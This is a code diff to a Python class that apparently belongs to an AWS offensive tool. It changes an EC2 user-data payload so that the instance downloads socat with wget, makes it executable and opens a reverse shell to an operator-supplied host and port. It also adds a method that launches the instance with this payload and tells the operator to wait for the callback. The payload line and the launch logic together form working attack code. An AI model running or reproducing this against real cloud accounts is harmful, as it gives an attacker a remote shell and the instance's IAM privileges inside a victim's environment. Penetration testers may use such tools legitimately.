@@ -8,8 +8,8 @@ class Ec2():
     def __init__(self, session, console):
         self.ec2 = session.client("ec2")
         self.console = console
-        self.user_data_payload = f"curl -o /tmp/socat https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" \
-        " && /tmp/socat tcp4:<rhost>:<rport> exec:/bin/bash"
+        self.user_data_payload = f"sudo apt install wget -y && wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat" \
+        " && chmod a+x /tmp/socat && /tmp/socat tcp:<rhost>:<rport> exec:/bin/sh,pty,stderr,setsid,sigint,sane"
     
     def _create_key_pair(self, key_name: str):
         def _create(key_name: str, dry=True):
@@ -51,21 +51,37 @@ class Ec2():
             self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
 
     def _run_instance(
-        self, key_name: str, ami_id: str, security_groups_ids: list,
-        subnet_id: str, instance_type: str, instance_profile_arn: str
+        self, key_name: str = "", ami_id: str = "", security_groups_ids: list = [],
+        subnet_id: str = "", instance_type: str = "", instance_profile_arn: str = "",
+        user_data: str = ""
         ):
         try:
-            results = self.ec2.run_instances(
-                ImageId=ami_id,
-                InstanceType=instance_type,
-                SecurityGroupIds=security_groups_ids,
-                IamInstanceProfile={"Arn": instance_profile_arn},
-                SubnetId=subnet_id,
-                KeyName=key_name,
-                MaxCount=1,
-                MinCount=1
-            )
-        except ClientError:
+            if key_name:
+                results = self.ec2.run_instances(
+                    ImageId=ami_id,
+                    InstanceType=instance_type,
+                    SecurityGroupIds=security_groups_ids,
+                    IamInstanceProfile={"Arn": instance_profile_arn},
+                    SubnetId=subnet_id,
+                    KeyName=key_name,
+                    UserData=user_data,
+                    MaxCount=1,
+                    MinCount=1
+                )
+            else:
+                results = self.ec2.run_instances(
+                    ImageId=ami_id,
+                    InstanceType=instance_type,
+                    SecurityGroupIds=security_groups_ids,
+                    IamInstanceProfile={"Arn": instance_profile_arn},
+                    SubnetId=subnet_id,
+                    UserData=user_data,
+                    MaxCount=1,
+                    MinCount=1
+                )
+
+        except ClientError as e:
+            self.console.log(e)
             self.console.log("An error occured.. ([red]ERROR[/red])")
             exit()
         self.console.print("Successfully launched Ec2 instance.. ([green]SUCCESS[/green])")
@@ -88,9 +104,15 @@ class Ec2():
         sleep(1)
         self._run_instance(key_name, ami_id, security_group_ids, subnet_id, instance_type, instance_profile_arn)
 
-    def user_data_rev_shell(self, rhost: str, rport: int):
-        self.user_data_payload.replace("<rhost>", rhost)
-        self.user_data_payload.replace("<rport>", rport)
+    def user_data_rev_shell(self, ami_id: str, instance_type: str, rhost: str, rport: int):
+        self.console.print("Creating reverse shell user data script.. ([blue]INFO[/blue])")
+        self.user_data_payload = self.user_data_payload.replace("<rhost>", rhost)
+        self.user_data_payload = self.user_data_payload.replace("<rport>", str(rport))
+        _tmp_payload = self.user_data_payload.replace(" && ", "\n")
+        self.console.print(f"User data payload preview.. ([yellow]PREVIEW[/yellow])\n\n```\n{_tmp_payload}\n```\n")
+        self.console.print("Running instance with reverse shell user data script.. ([green]OK[/green])\n")
+        self._run_instance(ami_id=ami_id, instance_type=instance_type, user_data=self.user_data_payload)
+        self.console.print("\nCheck your TCP listener after a minute or two for a callback.. ([red]ACTION[/red])")
 
     def get_instance_profiles(self):
         instance_ids = []
